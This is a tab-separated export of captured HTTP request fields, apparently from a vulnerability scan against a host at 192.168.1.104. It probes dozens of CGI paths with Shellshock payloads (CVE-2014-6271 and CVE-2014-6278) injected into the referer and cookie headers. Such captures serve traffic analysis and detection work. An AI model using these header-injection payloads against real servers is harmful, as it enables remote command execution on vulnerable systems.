http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
																	Keep-Alive										192.168.1.104									5424					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/mpcgi/pathtest.pl		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/mpcgi/pathtest.pl
																	Keep-Alive										192.168.1.104									5425					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/mpcgi/php		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/mpcgi/php
																	Keep-Alive										192.168.1.104									5426					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/mpcgi/php4		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/mpcgi/php4
																	Keep-Alive										192.168.1.104									5427					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/mpcgi/php5		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/mpcgi/php5
																	Keep-Alive										192.168.1.104									5429					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/mpcgi/php-cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/mpcgi/php-cgi
																	Keep-Alive										192.168.1.104									5431					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/mpcgi/php.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/mpcgi/php.cgi
																	Keep-Alive										192.168.1.104									5433					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/mpcgi/php.fcgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/mpcgi/php.fcgi
																	Keep-Alive										192.168.1.104									5434					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/mpcgi/printenv		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/mpcgi/printenv
																	Keep-Alive										192.168.1.104									5435					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/mpcgi/restore_config.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/mpcgi/restore_config.cgi
																	Keep-Alive										192.168.1.104									5437					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/mpcgi/ruby.rb		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/mpcgi/ruby.rb
																	Keep-Alive										192.168.1.104									5439					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/mpcgi/search		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/mpcgi/search
																	Keep-Alive										192.168.1.104									5441					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/mpcgi/search.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/mpcgi/search.cgi
																	Keep-Alive										192.168.1.104									5442					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/mpcgi/server.php		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/mpcgi/server.php
																	Keep-Alive										192.168.1.104									5443					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/mpcgi/status		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/mpcgi/status
																	Keep-Alive										192.168.1.104									5444					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/mpcgi/sysinfo.pl		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/mpcgi/sysinfo.pl
																	Keep-Alive										192.168.1.104									5446					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/mpcgi/test		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/mpcgi/test
																	Keep-Alive										192.168.1.104									5448					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/mpcgi/test-cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/mpcgi/test-cgi
																	Keep-Alive										192.168.1.104									5449					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/mpcgi/test.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/mpcgi/test.cgi
																	Keep-Alive										192.168.1.104									5450					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/mpcgi/test_cgi.php		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/mpcgi/test_cgi.php
																	Keep-Alive										192.168.1.104									5452					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/mpcgi/test.cgi.php		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/mpcgi/test.cgi.php
																	Keep-Alive										192.168.1.104									5454					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/mpcgi/test_cgi.pl		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/mpcgi/test_cgi.pl
																	Keep-Alive										192.168.1.104									5455					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/mpcgi/test-cgi.pl		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/mpcgi/test-cgi.pl
																	Keep-Alive										192.168.1.104									5457					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/mpcgi/test.py		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/mpcgi/test.py
																	Keep-Alive										192.168.1.104									5458					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/mpcgi/test.sh		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/mpcgi/test.sh
																	Keep-Alive										192.168.1.104									5459					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/mpcgi/tmUnblock.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/mpcgi/tmUnblock.cgi
																	Keep-Alive										192.168.1.104									5460					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/mpcgi/uname.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/mpcgi/uname.cgi
																	Keep-Alive										192.168.1.104									5461					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/mpcgi/viewcvs.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/mpcgi/viewcvs.cgi
																	Keep-Alive										192.168.1.104									5463					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/mpcgi/welcome		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/mpcgi/welcome
																	Keep-Alive										192.168.1.104									5465					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/mpcgi/whois.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/mpcgi/whois.cgi
																	Keep-Alive										192.168.1.104									5467					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/mpcgi/		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/mpcgi/
																	Keep-Alive										192.168.1.104									5468					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/
																	Keep-Alive										192.168.1.104									5469					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/admin.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/admin.cgi
																	Keep-Alive										192.168.1.104									5470					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/administrator.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/administrator.cgi
																	Keep-Alive										192.168.1.104									5472					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/authLogin.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/authLogin.cgi
																	Keep-Alive										192.168.1.104									5474					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/bb-hist.sh		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/bb-hist.sh
																	Keep-Alive										192.168.1.104									5476					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/banner.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/banner.cgi
																	Keep-Alive										192.168.1.104									5478					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/book.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/book.cgi
																	Keep-Alive										192.168.1.104									5479					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/cgiinfo.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/cgiinfo.cgi
																	Keep-Alive										192.168.1.104									5480					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/cgitest.py		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/cgitest.py
																	Keep-Alive										192.168.1.104									5481					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/cgi_wrapper		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/cgi_wrapper
																	Keep-Alive										192.168.1.104									5483					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/contact.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/contact.cgi
																	Keep-Alive										192.168.1.104									5485					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/count.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/count.cgi
																	Keep-Alive										192.168.1.104									5487					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/defaultwebpage.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/defaultwebpage.cgi
																	Keep-Alive										192.168.1.104									5489					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/download.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/download.cgi
																	Keep-Alive										192.168.1.104									5491					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/entropysearch.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/entropysearch.cgi
																	Keep-Alive										192.168.1.104									5492					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/env.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/env.cgi
																	Keep-Alive										192.168.1.104									5493					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/environment.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/environment.cgi
																	Keep-Alive										192.168.1.104									5494					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/ezmlm-browse		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/ezmlm-browse
																	Keep-Alive										192.168.1.104									5495					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/formmail.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/formmail.cgi
																	Keep-Alive										192.168.1.104									5497					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/FormMail-clone.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/FormMail-clone.cgi
																	Keep-Alive										192.168.1.104									5498					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/guestbook.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/guestbook.cgi
																	Keep-Alive										192.168.1.104									5500					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/helpdesk.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/helpdesk.cgi
																	Keep-Alive										192.168.1.104									5502					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/index.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/index.cgi
																	Keep-Alive										192.168.1.104									5504					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/index.php		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/index.php
																	Keep-Alive										192.168.1.104									5506					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/index.pl		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/index.pl
																	Keep-Alive										192.168.1.104									5507					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/info.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/info.cgi
																	Keep-Alive										192.168.1.104														() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/info.sh		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/info.sh
																	Keep-Alive										192.168.1.104									5515					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/loadpage.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/loadpage.cgi
																	Keep-Alive										192.168.1.104									5517					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/login.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/login.cgi
																	Keep-Alive										192.168.1.104									5519					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/login.php		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/login.php
																	Keep-Alive										192.168.1.104									5520					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/login.pl		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/login.pl
																	Keep-Alive										192.168.1.104									5522					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/pathtest.pl		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/pathtest.pl
																	Keep-Alive										192.168.1.104									5524					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/php		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/php
																	Keep-Alive										192.168.1.104									5526					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/php4		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/php4
																	Keep-Alive										192.168.1.104									5528					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/php5		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/php5
																	Keep-Alive										192.168.1.104									5530					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/php-cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/php-cgi
																	Keep-Alive										192.168.1.104									5532					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/php.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/php.cgi
																	Keep-Alive										192.168.1.104									5534					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/php.fcgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/php.fcgi
																	Keep-Alive										192.168.1.104									5536					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/printenv		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/printenv
																	Keep-Alive										192.168.1.104									5538					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/restore_config.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/restore_config.cgi
																	Keep-Alive										192.168.1.104									5540					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/ruby.rb		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/ruby.rb
																	Keep-Alive										192.168.1.104									5542					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/search		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/search
																	Keep-Alive										192.168.1.104									5544					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/search.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/search.cgi
																	Keep-Alive										192.168.1.104									5546					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/server.php		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/server.php
																	Keep-Alive										192.168.1.104									5548					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/status		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/status
																	Keep-Alive										192.168.1.104									5550					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/sysinfo.pl		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/sysinfo.pl
																	Keep-Alive										192.168.1.104									5552					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/test		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/test
																	Keep-Alive										192.168.1.104									5554					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/test-cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/test-cgi
																	Keep-Alive										192.168.1.104									5556					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/test.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/test.cgi
																	Keep-Alive										192.168.1.104									5558					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/test_cgi.php		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/test_cgi.php
																	Keep-Alive										192.168.1.104									5560					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/test.cgi.php		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/test.cgi.php
																	Keep-Alive										192.168.1.104									5562					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/test_cgi.pl		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/test_cgi.pl
																	Keep-Alive										192.168.1.104									5564					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/test-cgi.pl		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/test-cgi.pl
																	Keep-Alive										192.168.1.104									5566					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/test.py		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/test.py
																	Keep-Alive										192.168.1.104									5568					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/test.sh		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/test.sh
																	Keep-Alive										192.168.1.104									5570					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/tmUnblock.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/tmUnblock.cgi
																	Keep-Alive										192.168.1.104									5572					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/uname.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/uname.cgi
